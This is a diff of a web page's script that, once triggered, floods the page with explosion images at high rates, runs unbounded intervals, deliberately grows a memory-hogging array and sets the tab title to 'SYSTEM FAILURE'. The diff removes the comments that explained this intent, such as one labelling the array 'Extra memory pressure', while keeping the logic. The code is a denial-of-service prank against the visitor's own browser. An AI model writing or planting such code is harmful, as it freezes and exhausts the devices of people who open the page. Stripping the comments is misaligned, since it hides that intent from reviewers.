@@ -73,7 +73,7 @@
             opacity: 0.95;
             transform: translate(-50%, -50%);
             image-rendering: pixelated;
-            will-change: transform, opacity;   /* hint to browser: animate me fast */
+            will-change: transform, opacity;   
         }
     </style>
 </head>
@@ -169,7 +169,7 @@
                 if (!destroyed) return;
 
                 const img = new Image();
-                img.src = gifUrl + '#' + Math.random();  // bust cache aggressively
+                img.src = gifUrl + '#' + Math.random();  
                 img.className = 'boom';
                 img.alt = "BOOM";
 
@@ -182,41 +182,34 @@
                 const scale = 0.6 + Math.random() * 1.4;
                 img.style.transform = `rotate(${rot}deg) scale(${scale})`;
 
-                // Start behind overlay → after ~1s move to front
+               
                 img.style.zIndex = '1';
 
                 boomLayer.appendChild(img);
 
-                // Cleanup very old ones occasionally (helps not freeze instantly)
+                
                 if (Math.random() < 0.06 && boomLayer.children.length > 180) {
                     const oldest = boomLayer.children[0];
                     if (oldest) oldest.remove();
                 }
             }
+            const ultraFast = setInterval(spawnBoom, 20);           
+            setTimeout(() => clearInterval(ultraFast), 8000);      
 
-            // Lightning fast spawning
-            const ultraFast = setInterval(spawnBoom, 20);           // ~50/sec
-            setTimeout(() => clearInterval(ultraFast), 8000);      // cap runaway a bit
-
-            // Even faster burst mode after 1 second
             setTimeout(() => {
-                // Move explosions OVER the overlay text
                 boomLayer.style.zIndex = '10000';
 
-                // Super aggressive burst interval
                 setInterval(() => {
                     for (let i = 0; i < 12; i++) {
                         setTimeout(spawnBoom, i * 5000);
                     }
                 }, 280);
 
-                // Initial burst right when we go over
                 for (let i = 0; i < 60; i++) {
                     setTimeout(spawnBoom, i * 50);
                 }
             }, 1000);
 
-            // Extra memory pressure
             const leak = [];
             setInterval(() => {
                 try {
@@ -225,7 +218,6 @@
                 } catch {}
             }, 300);
 
-            // Title chaos
             let counter = 0;
             setInterval(() => {
                 document.title = "SYSTEM FAILURE ".repeat((counter++ % 5) + 2) + "☠×" + counter;
